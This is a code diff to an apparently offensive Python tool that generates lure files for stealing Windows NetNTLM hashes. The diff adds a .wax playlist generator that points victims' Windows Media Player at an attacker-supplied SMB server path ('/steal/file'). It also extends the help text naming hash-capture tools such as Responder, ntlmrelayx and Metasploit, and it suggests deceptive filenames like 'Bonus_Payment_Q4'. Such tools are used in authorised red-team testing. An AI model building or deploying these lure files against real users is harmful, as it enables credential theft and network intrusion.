@@ -21,6 +21,7 @@ from __future__ import print_function
 # https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py
 # https://github.com/rocketscientist911/excel-ntlmv2
 # https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/#comments
+# https://www.youtube.com/watch?v=PDpBEY1roRc
 
 import argparse
 import io
@@ -51,6 +52,7 @@ parser.add_argument('-g', '--generate',
 		"htm",
 		"docx",
 		"xlsx",
+		"wax",		
 		"m3u",
 		"asx",
 		"jnlp",
@@ -61,7 +63,7 @@ parser.add_argument('-g', '--generate',
 		"desktopini")),
     help='Choose to generate all files or a specific filetype')
 parser.add_argument('-s', '--server',action='store', dest='server',required=True,
-    help='The IP address of your SMB hash capture server (Responder, impacket ntlmrelayx, etc)')
+    help='The IP address of your SMB hash capture server (Responder, impacket ntlmrelayx, Metasploit auxiliary/server/capture/smb, etc)')
 parser.add_argument('-f', '--filename',action='store', dest='filename',required=True,
     help='The base filename without extension, can be renamed later (test, Board-Meeting2020, Bonus_Payment_Q4)')
 args = parser.parse_args()
@@ -232,6 +234,15 @@ def create_xlsx_externalcell(generate,server,filename):
 	worksheet = workbook.add_worksheet()
 	worksheet.write_url('AZ1', "external://"+server+"\\share\\[Workbookname.xlsx]SheetName'!$B$2:$C$62,2,FALSE)")
 	workbook.close()
+	print("Created: " + filename + " (OPEN)")
+
+# .wax remote playlist attack
+# Filename: shareattack.wax, action=open, attacks=windows media player
+def create_wax(generate,server,filename):
+	file = open(filename,'w')
+	file.write('''https://''' + server + '''/test
+file://\\\\''' + server + '''/steal/file''')
+	file.close()
 	print("Created: " + filename + " (OPEN)")
 
 # .m3u remote playlist attack
@@ -421,6 +432,8 @@ if (args.generate == "all" or args.generate == "modern"):
 
 	create_xlsx_externalcell(args.generate, args.server, os.path.join(args.filename, args.filename + "-(externalcell).xlsx"))
 
+	create_wax(args.generate, args.server, os.path.join(args.filename, args.filename + ".wax"))
+
 	create_m3u(args.generate, args.server, os.path.join(args.filename, args.filename + ".m3u"))
 
 	create_asx(args.generate, args.server, os.path.join(args.filename, args.filename + ".asx"))
@@ -462,6 +475,9 @@ elif(args.generate == "docx"):
 elif(args.generate == "xlsx"):
 	create_xlsx_externalcell(args.generate, args.server, os.path.join(args.filename, args.filename + "-(externalcell).xlsx"))
 	
+elif(args.generate == "wax"):
+	create_wax(args.generate, args.server, os.path.join(args.filename, args.filename + ".wax"))
+
 elif(args.generate == "m3u"):
 	create_m3u(args.generate, args.server, os.path.join(args.filename, args.filename + ".m3u"))
 
